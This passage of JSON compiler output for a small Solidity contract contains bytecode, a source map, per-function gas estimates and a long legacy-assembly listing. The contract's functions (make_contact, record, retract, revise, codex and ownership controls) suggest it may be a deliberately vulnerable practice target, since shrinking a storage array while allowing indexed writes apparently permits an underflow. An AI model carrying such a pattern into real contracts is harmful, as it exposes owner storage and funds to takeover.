JUMPDEST PUSH2 0x49F DUP2 PUSH2 0x4A2 JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x4DC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST DUP2 SLOAD DUP2 DUP4 SSTORE DUP2 DUP2 GT ISZERO PUSH2 0x5C1 JUMPI DUP2 DUP4 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP2 DUP3 ADD SWAP2 ADD PUSH2 0x5C0 SWAP2 SWAP1 PUSH2 0x5C6 JUMP JUMPDEST JUMPDEST POP POP POP JUMP JUMPDEST PUSH2 0x5E8 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0x5E4 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0x5CC JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 CALLER 0xE 0xE8 0xF9 0xB8 REVERT DUP10 MOD PUSH11 0xB0E296FAB271ECB82D27FF RETURNDATASIZE 0x22 SLT 0xBD 0xE0 DUP3 0xCD 0xC6 0xE3 0xE3 PUSH4 0x2A64736F PUSH13 0x63430005100032000000000000 ",
							"sourceMap": "165:472:0:-;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;165:472:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;543:91;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;543:91:0;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;203:19;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;474:63;;;:::i;:::-;;321:58;;;:::i;:::-;;540:137:2;;;:::i;:::-;;288:77;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;444:90;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;227:22:0;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;227:22:0;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;385:83;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;385:83:0;;;;;;;;;;;;;;;;;:::i;:::-;;683:107:2;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;683:107:2;;;;;;;;;;;;;;;;;;;:::i;:::-;;543:91:0;291:7;;;;;;;;;;;284:15;;;;620:8;609:5;615:1;609:8;;;;;;;;;;;;;;;:19;;;;543:91;;:::o;203:19::-;;;;;;;;;;;;;:::o;474:63::-;291:7;;;;;;;;;;;284:15;;;;517:5;:14;;;;;;;;;;;;:::i;:::-;;474:63::o;321:58::-;369:4;359:7;;:14;;;;;;;;;;;;;;;;;;321:58::o;540:137:2:-;410:9;:7;:9::i;:::-;402:18;;;;;;638:1;601:40;;622:6;;;;;;;;;;;601:40;;;;;;;;;;;;668:1;651:6;;:19;;;;;;;;;;;;;;;;;;540:137::o;288:77::-;326:7;352:6;;;;;;;;;;;345:13;;288:77;:::o;444:90::-;484:4;521:6;;;;;;;;;;;507:20;;:10;:20;;;500:27;;444:90;:::o;227:22:0:-;;;;;;;;;;;;;;;;;;;;;;;;;:::o;385:83::-;291:7;;;;;;;;;;;284:15;;;;442:5;453:8;442:20;;39:1:-1;33:3;27:10;23:18;57:10;52:3;45:23;79:10;72:17;;0:93;442:20:0;;;;;;;;;;;;;;;;;;;;;;385:83;:::o;683:107:2:-;410:9;:7;:9::i;:::-;402:18;;;;;;755:28;774:8;755:18;:28::i;:::-;683:107;:::o;796:183::-;889:1;869:22;;:8;:22;;;;861:31;;;;;;936:8;907:38;;928:6;;;;;;;;;;;907:38;;;;;;;;;;;;964:8;955:6;;:17;;;;;;;;;;;;;;;;;;796:183;:::o;165:472:0:-;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "313600",
								"executionCost": "23572",
								"totalCost": "337172"
							},
							"external": {
								"codex(uint256)": "2024",
								"contact()": "1126",
								"isOwner()": "1100",
								"make_contact()": "21128",
								"owner()": "1061",
								"record(bytes32)": "42128",
								"renounceOwnership()": "24386",
								"retract()": "infinite",
								"revise(uint256,bytes32)": "22055",
								"transferOwnership(address)": "24542"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 165,
									"end": 637,
									"name": "PUSH",
									"value": "80"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "MSTORE"
								},
								{
									"begin": 210,
									"end": 220,
									"name": "CALLER"
								},
								{
									"begin": 201,
									"end": 207,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 201,
									"end": 207,
									"name": "DUP1"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "EXP"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "DUP2"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "SLOAD"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "DUP2"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "MUL"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "NOT"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "AND"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "SWAP1"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "DUP4"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "AND"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "MUL"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "OR"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "SWAP1"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "SSTORE"
								},
								{
									"begin": 201,
									"end": 220,
									"name": "POP"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "DUP1"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "SWAP1"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "SLOAD"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "SWAP1"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "PUSH",
									"value": "100"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "EXP"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "SWAP1"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "DIV"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 268,
									"end": 274,
									"name": "AND"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "AND"
								},
								{
									"begin": 264,
									"end": 265,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "PUSH",
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "AND"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "PUSH",
									"value": "8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "MLOAD"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "PUSH",
									"value": "40"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "MLOAD"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "DUP1"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "SWAP2"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "SUB"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "SWAP1"
								},
								{
									"begin": 235,
									"end": 275,
									"name": "LOG3"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "DUP1"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "CODECOPY"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 165,
									"end": 637,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a265627a7a72315820330ee8f9b8fd89066ab0e296fab271ecb82d27ff3d2212bde082cdc6e3e3632a64736f6c63430005100032",
									".code": [
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "MSTORE"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "CALLVALUE"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "POP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "LT"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "SHR"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "GT"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "13"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "8DA5CB5B"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "8"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "8F32D59B"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "9"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "94BD7569"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "10"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "B5C645BD"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "11"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "F2FDE38B"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "12"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMP"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "339F300"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "3"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "33A8C45A"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "4"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "47F57B32"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "5"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "58699C55"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "6"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "715018A6"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "EQ"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH [tag]",
											"value": "7"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPI"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "tag",
											"value": "2"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "JUMPDEST"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "DUP1"
										},
										{
											"begin": 165,
											"end": 637,
											"name": "REVERT"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "tag",
											"value": "3"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "JUMPDEST"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "PUSH [tag]",
											"value": "14"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "DUP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "15"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "DUP2"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "ADD"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "DUP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "DUP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "ADD"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP3"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP2"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "DUP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "ADD"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP3"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP2"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "SWAP1"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "POP"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "POP"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "POP"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "PUSH [tag]",
											"value": "16"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "JUMPDEST"
										},
										{
											"begin": 543,
											"end": 634,
											"name": "STOP"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "tag",
											"value": "4"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "JUMPDEST"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH [tag]",
											"value": "17"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH [tag]",
											"value": "18"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "JUMPDEST"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "MLOAD"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "DUP1"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "DUP3"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "ISZERO"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "ISZERO"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "ISZERO"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "ISZERO"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "DUP2"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "MSTORE"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "ADD"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SWAP2"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "POP"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "POP"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "MLOAD"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "DUP1"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SWAP2"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SUB"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "SWAP1"
										},
										{
											"begin": 203,
											"end": 222,
											"name": "RETURN"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "tag",
											"value": "5"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "JUMPDEST"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "PUSH [tag]",
											"value": "19"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "PUSH [tag]",
											"value": "20"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "JUMPDEST"
										},
										{
											"begin": 474,
											"end": 537,
											"name": "STOP"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "tag",
											"value": "6"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "JUMPDEST"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "PUSH [tag]",
											"value": "21"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "PUSH [tag]",
											"value": "22"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "JUMPDEST"
										},
										{
											"begin": 321,
											"end": 379,
											"name": "STOP"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "tag",
											"value": "7"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "JUMPDEST"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "PUSH [tag]",
											"value": "23"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "PUSH [tag]",
											"value": "24"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "JUMPDEST"
										},
										{
											"begin": 540,
											"end": 677,
											"name": "STOP"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "tag",
											"value": "8"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "JUMPDEST"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "PUSH [tag]",
											"value": "25"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "PUSH [tag]",
											"value": "26"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "JUMPDEST"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "MLOAD"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "DUP1"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "DUP3"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "AND"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "PUSH",
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "AND"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "DUP2"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "MSTORE"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "ADD"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "SWAP2"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "POP"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "POP"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "MLOAD"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "DUP1"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "SWAP2"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "SUB"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "SWAP1"
										},
										{
											"begin": 288,
											"end": 365,
											"name": "RETURN"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "tag",
											"value": "9"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "JUMPDEST"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "PUSH [tag]",
											"value": "27"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "PUSH [tag]",
											"value": "28"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "JUMPDEST"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "MLOAD"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "DUP1"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "DUP3"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "ISZERO"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "ISZERO"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "ISZERO"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "ISZERO"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "DUP2"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "MSTORE"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "ADD"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "SWAP2"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "POP"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "POP"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "MLOAD"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "DUP1"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "SWAP2"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "SUB"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "SWAP1"
										},
										{
											"begin": 444,
											"end": 534,
											"name": "RETURN"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "tag",
											"value": "10"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "29"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 227,
											"end": 249,
											"name": "DUP1"
										},
										{
											"begin": 227,
											"end": 249,
